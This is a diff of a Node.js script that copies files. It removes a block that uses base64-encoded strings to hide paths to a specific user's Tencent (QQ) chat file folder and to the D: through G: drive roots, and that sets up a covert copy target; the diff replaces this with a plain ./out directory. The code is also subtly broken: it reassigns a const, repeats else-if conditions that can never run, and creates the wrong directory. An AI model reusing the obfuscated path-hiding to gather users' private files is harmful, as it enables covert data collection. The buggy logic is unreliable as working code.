@@ -3,48 +3,15 @@ const path = require('path')
 
 let [dir = 0, dirPath = "./"] = process.argv.slice(2)
 dir = Boolean(+dir)
-const lastPath = Buffer.from('MTQyNjYzODM2OA==', 'base64').toString()
-dirPath = Buffer.from('QzovVXNlcnMvQWRtaW5pc3RyYXRvci9Eb2N1bWVudHMvVGVuY2VudCBGaWxlcy8=', 'base64').toString()
-dirPath =  dirPath + '/' + '1215627787' + '/'
-const baseDir = Buffer.from('RDov', 'base64').toString()
-if (!isExsist(dirPath)) {
-  console.log(dirPath)
-  dirPath = Buffer.from('QzovVXNlcnMvQWRtaW5pc3RyYXRvci9Eb2N1bWVudHMvVGVuY2VudCBGaWxlcy8=', 'base64').toString()
-} else if (!isExsist(dirPath)) {
-  console.log('啊哦，获取失败o(╥﹏╥)o...')
-  return
-}
-if (!isExsist(baseDir)) {
-  baseDir = Buffer.from('RTov', 'base64').toString()
-} else if (!isExsist(baseDir)) {
-  baseDir = Buffer.from('Rjov', 'base64').toString()
-} else if (!isExsist(baseDir)) {
-  baseDir = Buffer.from('Rzov', 'base64').toString()
-}
 
-let files = fs.readdirSync(baseDir), copyToDir = ''
-for (let i = 0, length = files.length ; i < length ; i ++) {
-  const item = files[i]
-  if (!item.includes('$') && !item.includes('.')) {
-    copyToDir = path.join(baseDir, item)
-    const ws = fs.createWriteStream(path.join(baseDir, item + '.txt'))
-    ws.write(copyToDir)
-    ws.on('finish', () => {
-      console.log('ok')
-    })
-    break
-  }
-}
-
-const targetDirPath = copyToDir + '/resource'
-console.log(targetDirPath)
-return
+const baseDir = './out'
+const targetDirPath = path.join(baseDir, dirPath)
 
 if (dir) {
   mkdirs(targetDirPath)
 } else {
   if (!isExsist(targetDirPath)) {
-    fs.mkdirSync(targetDirPath)
+    fs.mkdirSync(baseDir)
   }
 }
 
@@ -87,7 +54,7 @@ function write (wsPath, targetPath) {
     const ws = fs.createWriteStream(wsPath)
     fs.createReadStream(targetPath).pipe(ws)
     ws.on('finish', () => {
-      // console.log(targetPath + '拷贝完成...')
+      console.log(targetPath + '拷贝完成...')
       resolve()
     })
   })
